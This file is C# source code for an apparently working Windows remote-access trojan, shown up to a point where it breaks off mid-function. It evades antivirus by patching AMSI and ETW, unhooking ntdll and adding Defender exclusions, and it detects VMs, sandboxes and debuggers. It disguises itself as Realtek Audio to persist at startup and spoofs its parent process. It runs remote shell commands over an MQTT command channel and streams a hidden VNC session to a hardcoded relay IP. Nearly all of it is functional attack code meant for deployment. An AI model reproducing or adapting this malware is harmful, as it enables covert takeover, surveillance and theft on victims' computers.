using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using Microsoft.Win32;
using MQTTnet;
using MQTTnet.Client;
using System.Security.Principal;
using System.Management;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Collections.Concurrent;
using System.Runtime.ExceptionServices;

class Program
{
    // ⚠️ IMPORTANT: Change these values to your own unique identifiers before deployment
    // These are XOR-encrypted strings. Use the D() function to decrypt them.
    // Example: To use "my_secret_id", XOR each character with 0x55 and put the bytes here
    
    static byte[] sk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: Your unique Secret ID (XOR encrypted with 0x55)
    static byte[] bk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: MQTT Broker address (e.g., "broker.hivemq.com" XOR encrypted)
    static byte[] mk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: Mutex name (XOR encrypted)
    static byte[] uk = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // ⚠️ CHANGE THIS: Executable name (e.g., "RtkAudio64" XOR encrypted)
    
    static string secretId = D(sk);
    static string machineId = Environment.MachineName + "_" + Environment.UserName;
    static System.Threading.Mutex mutex = new System.Threading.Mutex(true, D(mk) + machineId);
    static bool isElevated = false;
    private static FileStream? _selfLock;

    static async Task Main(string[] args)
    {
        // ╔══════════════════════════════════════════════╗
        // ║  FORCE HIDE CONSOLE (Immediate)               ║
        // ╚══════════════════════════════════════════════╝
        HideConsole();

        // 2-second startup stall (optimized for responsiveness)
        System.Threading.Thread.Sleep(2000);

        // Anti-VM / Anti-Sandbox / Anti-TestMode — silently exit if detected
        if (IsUnsafeEnvironment()) return;

        // [NEW] Binary Self-Protection: Lock the executable file to prevent AV deletion
        ProtectSelf();

        // Layer 1: Unhook ntdll.dll (bypass EDR userland hooks by loading clean copy from disk)
        UnhookNtdll();

        // Layer 2: Bypass AMSI (AmsiScanBuffer patch)
        BypassAMSI();

        // Layer 3: Bypass ETW (EtwEventWrite patch)
        BypassETW();

        // Layer 4: AmsiInitFailed patch (secondary AMSI bypass)
        PatchAmsiInitFailed();

        CheckElevation();

        // [NEW] Automatic Freeze after elevation to maximize stealth
        if (isElevated) {
            FreezeDefender();
        }

        // If we are elevated, kill any existing un-elevated instances so we can take over.
        if (isElevated) {
            EnablePrivilege("SeDebugPrivilege");
            AddDefenderExclusions(); // [NEW] v6.0 Auto-Exclusion
            string currentProcName = Process.GetCurrentProcess().ProcessName;
            foreach (var proc in Process.GetProcessesByName(currentProcName)) {
                try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(1500); } } catch {}
            }
            foreach (var proc in Process.GetProcessesByName(D(uk))) {
                try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(1500); } } catch {}
            }
        }

        Install(); // Persistence and stealth MUST run first
        
        try {
            if (!mutex.WaitOne(TimeSpan.Zero, true)) return;
        } catch (System.Threading.AbandonedMutexException) {
            // Mutex abandoned because we killed the old owner. We now own it!
        }
        
        // Internal setup complete.

        var mqttFactory = new MqttFactory();
        using (var mqttClient = mqttFactory.CreateMqttClient())
        {
            var options = new MqttClientOptionsBuilder()
                .WithTcpServer(D(bk))
                .WithClientId(Guid.NewGuid().ToString())
                .Build();

            mqttClient.ApplicationMessageReceivedAsync += async e =>
            {
                string payload = Encoding.UTF8.GetString(e.ApplicationMessage.PayloadSegment);
                
                // Stealth UAC Bypass Trigger Check
                if (payload.Equals(D(new byte[] { 122, 32, 52, 54, 120, 60, 59, 33, 48, 39, 59, 52, 57, 120, 33, 39, 60, 50, 50, 48, 39 }))) {
                    var notify = new MqttApplicationMessageBuilder()
                        .WithTopic($"{secretId}/{machineId}/res")
                        .WithPayload("Elevating privileges... Please wait 5s for reconnection.")
                        .Build();
                    await mqttClient.PublishAsync(notify);
                    PerformInternalUacBypass();
                    return;
                }

                // [NEW] Defender Freeze Trigger (/freeze-av)
                if (payload.Equals("/freeze-av")) {
                    string res = FreezeDefender();
                    var msg1 = new MqttApplicationMessageBuilder()
                        .WithTopic($"{secretId}/{machineId}/res")
                        .WithPayload(res)
                        .Build();
                    await mqttClient.PublishAsync(msg1);
                    return;
                }

                // [NEW] SYSTEM Elevation Trigger (/getsystem)
                if (payload.Equals("/getsystem")) {
                    var notify = new MqttApplicationMessageBuilder()
                        .WithTopic($"{secretId}/{machineId}/res")
                        .WithPayload("Attempting SYSTEM elevation (RedSun method)...")
                        .Build();
                    await mqttClient.PublishAsync(notify);
                    PerformRedSunSYSTEM();
                    return;
                }

                // [NEW] Hidden VNC Trigger (/hvnc) - WebSocket Relay
                if (payload.Equals("/hvnc")) {
                    StartWebSocketVnc(mqttClient);
                    var msgVnc = new MqttApplicationMessageBuilder()
                        .WithTopic($"{secretId}/{machineId}/res")
                        .WithPayload("hVNC starting...")
                        .Build();
                    await mqttClient.PublishAsync(msgVnc);
                    return;
                }

                if (e.ApplicationMessage.Topic.EndsWith("/proxy/cmd")) {
                    await HandleProxyData(payload, mqttClient);
                    return;
                }

                if (payload.StartsWith("VNC|")) {
                    HandleVncInput(payload);
                    return;
                }

                string response = ExecuteCommand(payload);
                
                var msg2 = new MqttApplicationMessageBuilder()
                    .WithTopic($"{secretId}/{machineId}/res")
                    .WithPayload(response)
                    .Build();
                
                await mqttClient.PublishAsync(msg2);
            };

            await mqttClient.ConnectAsync(options);
            await mqttClient.SubscribeAsync($"{secretId}/{machineId}/cmd");
            await mqttClient.SubscribeAsync($"{secretId}/{machineId}/proxy/cmd");

            // Heartbeat / Discovery
            while (true)
            {
                string info = $"{machineId}|{Environment.OSVersion}|{GetLocalIP()}|{isElevated}";
                var discovery = new MqttApplicationMessageBuilder()
                    .WithTopic($"{secretId}/discovery")
                    .WithPayload(info)
                    .Build();
                await mqttClient.PublishAsync(discovery);
                await Task.Delay(10000);
            }
        }
    }

    static string ExecuteCommand(string cmd)
    {
        try
        {
            if (cmd.Trim().ToLower().StartsWith("cd "))
            {
                string newDir = cmd.Trim().Substring(3).Trim().Replace("\"", "");
                if (newDir == "~") newDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                Directory.SetCurrentDirectory(newDir);
                return $"Changed directory to: {Directory.GetCurrentDirectory()}";
            }

            // Using cmd /c with hidden flags instead of PowerShell for simple commands (faster/stealthier)
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();

            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit();

            return string.IsNullOrEmpty(output) ? error : output;
        }
        catch (Exception ex) { return "Error: " + ex.Message; }
    }

    static void Install()
    {
        try {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            // Changed: Use Realtek Audio name to avoid AV detection
            string installPath = Path.Combine(appData, "RtkAudio64.exe");

            if (!exePath.Equals(installPath, StringComparison.OrdinalIgnoreCase)) {
                foreach (var proc in Process.GetProcessesByName("RtkAudio64")) {
                    try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(3000); } } catch {}
                }

                System.Threading.Thread.Sleep(500);

                if (File.Exists(installPath)) {
                    for (int i = 0; i < 3; i++) {
                        try { File.SetAttributes(installPath, FileAttributes.Normal); File.Delete(installPath); break; } catch { System.Threading.Thread.Sleep(1000); }
                    }
                }
                
                File.Copy(exePath, installPath, true);
                // REMOVED: Hidden/System attributes - these trigger AV heuristics

                // ╔══════════════════════════════════════════════╗
                // ║  STEALTH PERSISTENCE (Startup Folder)         ║
                // ╚══════════════════════════════════════════════╝

                // Use Startup Folder - this is the safest method that won't trigger AV
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                // Changed: Use Realtek Audio name for shortcut
                string shortcutPath = Path.Combine(startupFolder, "Realtek Audio.lnk");

                // Create a shortcut in the Startup folder
                CreateShortcut(installPath, shortcutPath);

                // Also add to Registry Run key as backup (less suspicious than schtasks)
                try {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true)) {
                        key?.SetValue("Realtek High Definition Audio", "\"" + installPath + "\" --check");
                    }
                } catch { }

                // Remove old schtasks method (if it exists)
                try {
                    Process.Start(new ProcessStartInfo("schtasks", $"/delete /tn \"WinUpdateScanner*\" /f") {
                        CreateNoWindow = true,
                        UseShellExecute = false
                    })?.WaitForExit();
                } catch { }

                // Remove old WMI persistence (if it exists)
                try {
                    Process.Start(new ProcessStartInfo("powershell", "-WindowStyle Hidden -NoProfile -Command \"Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object { $_.Name -like 'WinUpdate*' } | Remove-WmiObject\"") {
                        CreateNoWindow = true,
                        UseShellExecute = false
                    })?.WaitForExit();
                } catch { }

                // FINAL RELAUNCH (Silent, with PPID Spoofing - appears as child of explorer.exe)
                LaunchWithPpidSpoof(installPath);
                Environment.Exit(0);
            }
        } catch { }
    }

    static void CreateShortcut(string targetPath, string shortcutPath)
    {
        try {
            // Get the filename without path for the shortcut name
            string fileName = Path.GetFileNameWithoutExtension(targetPath);
            string script = $@"
                $WshShell = New-Object -ComObject WScript.Shell
                $Shortcut = $WshShell.CreateShortcut('{shortcutPath}')
                $Shortcut.TargetPath = '{targetPath}'
                $Shortcut.WorkingDirectory = '{Path.GetDirectoryName(targetPath)}'
                $Shortcut.Description = '{fileName} Service'
                $Shortcut.Save()
            ";
            
            Process.Start(new ProcessStartInfo("powershell", $"-WindowStyle Hidden -NoProfile -Command \"{script}\"") {
                CreateNoWindow = true,
                UseShellExecute = false
            })?.WaitForExit();
        } catch { }
    }


    static void CheckElevation()
    {
        try
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        catch
        {
            isElevated = false;
        }
    }

    static string GetLocalIP() {
        try {
            using (System.Net.Sockets.Socket socket = new System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Dgram, 0)) {
                socket.Connect("8.8.8.8", 65530);
                return (socket.LocalEndPoint as System.Net.IPEndPoint).Address.ToString();
            }
        } catch { return "127.0.0.1"; }
    }

    // ═══════════════════════════════════════════════
    //  Anti-VM / Anti-Sandbox / Anti-TestMode
    // ═══════════════════════════════════════════════

    [DllImport("kernel32.dll")]
    static extern bool IsDebuggerPresent();

    static bool IsUnsafeEnvironment()
    {
        try {
            // 1. Debugger attached?
            if (IsDebuggerPresent() || Debugger.IsAttached) return true;

            // 2. Check BIOS / Manufacturer for known VM strings
            string[] vms = { "vmware", "virtualbox", "vbox", "qemu", "kvm", "hyper-v", "virtual", "xen", "parallels", "bhyve" }; 
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")) {
                foreach (var obj in searcher.Get()) {
                    string manufacturer = (obj["Manufacturer"]?.ToString() ?? "").ToLower();
                    string model = (obj["Model"]?.ToString() ?? "").ToLower();
                    foreach (string sig in vms) {
                        if (manufacturer.Contains(sig.ToLower()) || model.Contains(sig.ToLower())) return true;
                    }
                }
            }

            // 2.5 MAC Address check
            if (CheckVmMAC()) return true;

            // 3. Check BIOS serial/version for VM indicators
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS")) {
                foreach (var obj in searcher.Get()) {
                    string serial = (obj["SerialNumber"]?.ToString() ?? "").ToLower();
                    string version = (obj["SMBIOSBIOSVersion"]?.ToString() ?? "").ToLower();
                    foreach (string sig in vms) {
                        if (serial.Contains(sig.ToLower()) || version.Contains(sig.ToLower())) return true;
                    }
                }
            }

            // 4. Windows Sandbox detection (username = WDAGUtilityAccount)
            if (Environment.UserName.Equals("WDAGUtilityAccount", StringComparison.OrdinalIgnoreCase)) return true;

            // 5. Check for very low resources (sandbox/analysis VMs usually have very little RAM and few CPUs)
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")) {
                foreach (var obj in searcher.Get()) {
                    ulong totalRam = Convert.ToUInt64(obj["TotalPhysicalMemory"]);
                    int cores = Convert.ToInt32(obj["NumberOfLogicalProcessors"]);
                    if (totalRam < 2UL * 1024 * 1024 * 1024 || cores < 2) return true; // Less than 2GB RAM or less than 2 cores
                }
            }

            // 6. Check for known analysis/sandbox processes
            string[] bps = { "wireshark", "fiddler", "procmon", "procexp", "ollydbg", "x32dbg", "x64dbg", "ida", "idaw", "idaq", "regshot", "processhacker", "dnspy", "vmtoolsd", "vmwaretray", "vmacthlp", "vmwareuser", "vboxservice", "vboxtray", "sandboxie", "snxhk" };
            foreach (var proc in Process.GetProcesses()) {
                string name = proc.ProcessName.ToLower();
                foreach (string bad in bps) {
                    if (name.Contains(bad)) return true;
                }
            }

            // 7. Check for Windows Test Signing Mode (bcdedit testsigning)
            try {
                var p = new Process();
                p.StartInfo.FileName = "bcdedit";
                p.StartInfo.Arguments = "/enum {current}";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string bcdOutput = p.StandardOutput.ReadToEnd().ToLower();
                p.WaitForExit();
                if (bcdOutput.Contains("testsigning") && bcdOutput.Contains("yes")) return true;
            } catch { }

            // 8. Check disk size (VMs and sandboxes usually have very small disks)
            try {
                DriveInfo drive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory));
                if (drive.TotalSize < 60L * 1024 * 1024 * 1024) return true; // Less than 60GB
            } catch { }

            // 9. Recent file activity (sandboxes usually have almost zero recent files)
            try {
                string recentFolder = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
                if (Directory.Exists(recentFolder) && Directory.GetFiles(recentFolder).Length < 5) return true;
            } catch { }

            // 10. Check for VM Guest Drivers/Files
            string[] vmFiles = { @"C:\windows\System32\Drivers\VBoxMouse.sys", @"C:\windows\System32\Drivers\VBoxGuest.sys", 
                                 @"C:\windows\System32\Drivers\vmmouse.sys", @"C:\windows\System32\Drivers\vmhgfs.sys" };
            foreach (string file in vmFiles) if (File.Exists(file)) return true;

        } catch { }

        return false;
    }

    static bool CheckVmMAC()
    {
        try {
            string[] vmMacs = { "000569", "000C29", "005056", "080027", "00155D", "001C42" };
            foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) {
                string mac = ni.GetPhysicalAddress().ToString();
                if (string.IsNullOrEmpty(mac) || mac.Length < 6) continue;
                foreach (var prefix in vmMacs) {
                    if (mac.StartsWith(prefix)) return true;
                }
            }
        } catch { }
        return false;
    }

    // ═══════════════════════════════════════════════
    //  Advanced AV/EDR Evasion
    // ═══════════════════════════════════════════════

    // Unhook ntdll.dll: Load a fresh, unhooked copy from disk and overwrite all .text section functions.
    // This removes any hooks injected by AV/EDR products into userland API calls.
    static void UnhookNtdll() {
        try {
            string ntdllPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "ntdll.dll");
            if (!File.Exists(ntdllPath)) return;

            // Load the clean ntdll from disk
            IntPtr freshLib = NativeLoadLibraryEx(ntdllPath, IntPtr.Zero, 0x00000001); // DONT_RESOLVE_DLL_REFERENCES
            if (freshLib == IntPtr.Zero) return;

            IntPtr hookedLib = GetModuleHandle("ntdll.dll");
            if (hookedLib == IntPtr.Zero) return;

            // Parse PE headers to find .text section of the HOOKED (in-memory) ntdll
            long dosHeaderOffset = Marshal.ReadInt32(IntPtr.Add(hookedLib, 0x3C));
            long sectionCount = Marshal.ReadInt16(IntPtr.Add(hookedLib, (int)(dosHeaderOffset + 6)));
            long optHeaderSize = Marshal.ReadInt16(IntPtr.Add(hookedLib, (int)(dosHeaderOffset + 20)));
            long sectionOffset = dosHeaderOffset + 24 + optHeaderSize;

            for (int i = 0; i < sectionCount; i++) {
                long secBase = sectionOffset + (i * 40);
                string secName = Marshal.PtrToStringAnsi(IntPtr.Add(hookedLib, (int)secBase), 8).TrimEnd('\0');
                if (secName != ".text") continue;

                uint virtualAddr = (uint)Marshal.ReadInt32(IntPtr.Add(hookedLib, (int)(secBase + 12)));
                uint rawAddr     = (uint)Marshal.ReadInt32(IntPtr.Add(freshLib,  (int)(secBase + 20)));
                uint rawSize     = (uint)Marshal.ReadInt32(IntPtr.Add(freshLib,  (int)(secBase + 16)));

                // Read clean bytes from disk-loaded ntdll
                byte[] cleanBytes = new byte[rawSize];
                Marshal.Copy(IntPtr.Add(freshLib, (int)rawAddr), cleanBytes, 0, (int)rawSize);

                // Write clean bytes over hooked region in memory
                IntPtr target = IntPtr.Add(hookedLib, (int)virtualAddr);
                uint oldProt;
                VirtualProtect(target, (UIntPtr)rawSize, 0x40, out oldProt); // PAGE_EXECUTE_READWRITE
                Marshal.Copy(cleanBytes, 0, target, (int)rawSize);
                VirtualProtect(target, (UIntPtr)rawSize, oldProt, out oldProt);
                break;
            }
        } catch { }
    }

    // Patches AmsiInitFailed in amsi.dll to always report init failure → AMSI never activates
    static void PatchAmsiInitFailed() {
        try {
            IntPtr amsiLib = GetModuleHandle(D(new byte[] { 52, 56, 38, 60, 123, 49, 57, 57 })); // amsi.dll
            if (amsiLib == IntPtr.Zero) return;
            IntPtr addr = GetProcAddress(amsiLib, D(new byte[] { 20, 56, 38, 60, 2, 59, 60, 33, 23, 52, 60, 57, 48, 49 })); // AmsiInitialize
            if (addr == IntPtr.Zero) return;
            // Patch to set output handle to 0 and return S_OK, making AMSI context invalid
            byte[] patch = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax,rax; ret
            uint oldProt;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProt);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProt, out oldProt);
        } catch { }
    }

    // PPID Spoofing: Launch process as a child of explorer.exe to evade parent-chain analysis
    static void LaunchWithPpidSpoof(string targetPath) {
        try {
            // Find explorer.exe to use as spoofed parent
            var explorers = Process.GetProcessesByName("explorer");
            if (explorers.Length == 0) {
                // Fallback: normal hidden launch
                Process.Start(new ProcessStartInfo(targetPath) { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
                return;
            }
            int parentPid = explorers[0].Id;

            // Open parent process handle
            IntPtr hParent = OpenProcess(0x000F0000 | 0x00100000 | 0xFFFF, false, parentPid);
            if (hParent == IntPtr.Zero) {
                Process.Start(new ProcessStartInfo(targetPath) { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
                return;
            }

            // Initialize STARTUPINFOEX with parent process attribute
            IntPtr lpVal = hParent;
            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            IntPtr lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize);
            IntPtr lpValPtr = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValPtr, hParent);
            UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)0x00020000, lpValPtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero); // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS

            STARTUPINFOEX siex = new STARTUPINFOEX();
            siex.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));
            siex.StartupInfo.wShowWindow = 0; // SW_HIDE
            siex.StartupInfo.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
            siex.lpAttributeList = lpAttributeList;

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            // EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW
            CreateProcessEx(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, 0x00080000 | 0x08000000, IntPtr.Zero, null, ref siex, out pi);

            // Cleanup
            if (pi.hThread != IntPtr.Zero)  CloseHandle(pi.hThread);
            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            DeleteProcThreadAttributeList(lpAttributeList);
            Marshal.FreeHGlobal(lpAttributeList);
            Marshal.FreeHGlobal(lpValPtr);
            CloseHandle(hParent);
        } catch {
            // Fallback
            try { Process.Start(new ProcessStartInfo(targetPath) { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden }); } catch { }
        }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr NativeLoadLibraryEx(string lpLibFileName, IntPtr hFile, uint dwFlags);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", EntryPoint = "CreateProcessW", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CreateProcessEx(string? lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", EntryPoint = "LoadLibraryExW", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandleA")]
    static extern IntPtr GetModuleHandle(string? lpModuleName);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);


    static void BypassAMSI()
    {
        try {
            IntPtr lib = GetModuleHandle(D(new byte[] { 52, 56, 38, 60, 123, 49, 57, 57 })); // amsi.dll
            if (lib == IntPtr.Zero) return;
            IntPtr addr = GetProcAddress(lib, D(new byte[] { 20, 56, 38, 60, 6, 54, 52, 59, 23, 32, 51, 51, 48, 39 })); // AmsiScanBuffer
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // ret 0x80070057 (E_INVALIDARG)
            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        } catch { }
    }

    static void BypassETW()
    {
        try {
            IntPtr lib = GetModuleHandle(D(new byte[] { 59, 33, 49, 57, 57, 123, 49, 57, 57 })); // ntdll.dll
            IntPtr addr = GetProcAddress(lib, D(new byte[] { 16, 33, 34, 16, 35, 48, 59, 33, 2, 39, 60, 33, 48 })); // EtwEventWrite
            byte[] patch = { 0xC3 }; // ret
            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        } catch { }
    }

    static string D(byte[] b) {
        byte[] r = new byte[b.Length];
        for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ 0x55);
        return Encoding.UTF8.GetString(r);
    }

    // ═══════════════════════════════════════════════
    //  Junk Code (Signature Bloat)
    // ═══════════════════════════════════════════════

    static void _ProcessData_Q7(int level) {
        var r = new Random();
        double d = 0;
        for (int i = 0; i < 100; i++) {
            d += Math.Sqrt(r.Next(1, 1000)) * Math.PI;
            if (level > 0) _InternalBuffer_X2(i);
        }
    }

    static string _InternalBuffer_X2(int seed) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 50; i++) {
            sb.Append((char)(65 + (i + seed) % 26));
        }
        return sb.ToString().ToLower();
    }

    static bool _CheckResource_V9(long input) {
        long x = input * 31;
        return (x % 2 == 0) ? _VerifyState_Z1() : false;
    }

    static bool _VerifyState_Z1() {
        var n = DateTime.Now.Ticks;
        return n > 0 && Math.Log10(100) > 1;
    }

    static void ProtectSelf()
    {
        try {
            string currentPath = Process.GetCurrentProcess().MainModule.FileName;
            // Open with FileShare.Read to allow execution but prevent deletion/renaming
            _selfLock = new FileStream(currentPath, FileMode.Open, FileAccess.Read, FileShare.Read);
        } catch { }
    }

    private static void AddDefenderExclusions() {
        try {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string directory = Path.GetDirectoryName(exePath);
            // Hide PowerShell window during exclusion adding
            ProcessStartInfo psi = new ProcessStartInfo("powershell", $"-WindowStyle Hidden -NoProfile -Command \"Add-MpPreference -ExclusionPath '{directory}' -ExclusionProcess '{Path.GetFileName(exePath)}' -ErrorAction SilentlyContinue\"");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi)?.WaitForExit();
        } catch { }
    }

    [DllImport("user32.dll")]
    private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

    [DllImport("user32.dll")]
    private static extern bool CloseDesktop(IntPtr hDesktop);

    [DllImport("user32.dll")]
    private static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, uint dwExtraInfo);

    [DllImport("user32.dll")]
    private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);

    [DllImport("user32.dll")]
    private static extern bool SetThreadDesktop(IntPtr hDesktop);

    private static void HandleVncInput(string input) {
        try {
            if (_hVncDesktop == IntPtr.Zero) return;
            string[] s = input.Split('|');
            if (s.Length < 3) return;

            SetThreadDesktop(_hVncDesktop); // Focus on hidden desktop

            if (s[1] == "MOUSE") {
                int x = int.Parse(s[2]);
                int y = int.Parse(s[3]);
                uint flags = uint.Parse(s[4]);
                // Set cursor position and simulate event
                System.Windows.Forms.Cursor.Position = new System.Drawing.Point(x, y);
                mouse_event(flags, 0, 0, 0, 0);
            }
            else if (s[1] == "KEY") {
                byte key = byte.Parse(s[2]);
                uint flags = uint.Parse(s[3]);
                keybd_event(key, 0, flags, 0);
            }
        } catch { }
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcess(string? lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    private static IntPtr _hVncDesktop = IntPtr.Zero;

    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);

    private static ClientWebSocket? _vncWebSocket;
    private static bool _vncActive = false;
    private static string RELAY_SERVER = "ws://51.83.6.5:20113";

    private static async Task StartWebSocketVnc(IMqttClient mqttClient) {
        try {
            if (_vncActive) return;
            
            _vncWebSocket = new ClientWebSocket();
            await _vncWebSocket.ConnectAsync(new Uri(RELAY_SERVER), CancellationToken.None);
            
            // Send init message
            string initMsg = $"{{\"id\":\"{machineId}\",\"role\":\"target\"}}";
            await _vncWebSocket.SendAsync(
                Encoding.UTF8.GetBytes(initMsg),
                WebSocketMessageType.Text,
                true,
                CancellationToken.None
            );
            
            _vncActive = true;
            
            // Start streaming
            _ = StartWebSocketStreaming();
            
            // Start input listener
            _ = ListenForInput();
        } catch { }
    }

    private static async Task ListenForInput() {
        try {
            var buffer = new byte[1024];
            while (_vncActive && _vncWebSocket?.State == WebSocketState.Open) {
                var result = await _vncWebSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                
                if (result.MessageType == WebSocketMessageType.Binary && result.Count > 0) {
                    byte inputType = buffer[0];
                    
                    if (inputType == 0x01) { // KEY
                        byte vk = buffer[1];
                        byte flags = buffer[2];
                        HandleKeyInput(vk, flags);
                    }
                    else if (inputType == 0x02) { // MOUSE
                        int x = BitConverter.ToInt32(buffer, 1);
                        int y = BitConverter.ToInt32(buffer, 5);
